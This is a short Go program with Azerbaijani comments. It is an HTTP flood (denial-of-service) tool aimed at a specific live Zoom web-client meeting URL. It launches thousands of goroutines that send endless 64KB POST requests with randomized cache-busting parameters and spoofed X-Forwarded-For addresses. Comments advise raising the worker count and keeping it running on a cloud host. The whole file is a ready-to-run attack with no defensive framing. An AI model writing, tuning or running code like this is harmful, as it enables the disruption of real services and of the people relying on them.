package main

import (
	"crypto/tls"
	"fmt"
	"math/rand"
	"net/http"
	"runtime"
	"strings"
	"time"
)

func main() {
	// Bütün CPU nüvələrini işə sal
	runtime.GOMAXPROCS(runtime.NumCPU())

	target := "https://us04web.zoom.us/wc/join/71339982630"
	// Railway paketin güclüdürsə 10000-ə qədər qaldıra bilərsən
	workers := 8000 

	fmt.Printf("[!!!] HAKAI-FORCE DEVRƏDƏ: %s\n", target)

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		DisableKeepAlives:   true, 
		MaxIdleConns:        0,
		MaxIdleConnsPerHost: 10000,
	}

	client := &http.Client{
		Transport: tr,
		Timeout:   3 * time.Second,
	}

	// 64KB ağır paket
	payload := "action=join&meeting_id=71339982630&data=" + strings.Repeat("X", 65536)

	for i := 0; i < workers; i++ {
		go func(id int) {
			for {
				u := fmt.Sprintf("%s?bypass=%d&t=%d", target, rand.Intn(9999999), time.Now().UnixNano())
				req, _ := http.NewRequest("POST", u, strings.NewReader(payload))
				
				req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
				req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
				
				// Fake IP seli
				ip := fmt.Sprintf("%d.%d.%d.%d", rand.Intn(255), rand.Intn(255), rand.Intn(255), rand.Intn(255))
				req.Header.Set("X-Forwarded-For", ip)

				resp, err := client.Do(req)
				if err == nil {
					resp.Body.Close()
				}
			}
		}(i)
	}

	// Railway-də proqramın dayanmaması üçün
	select {}
}
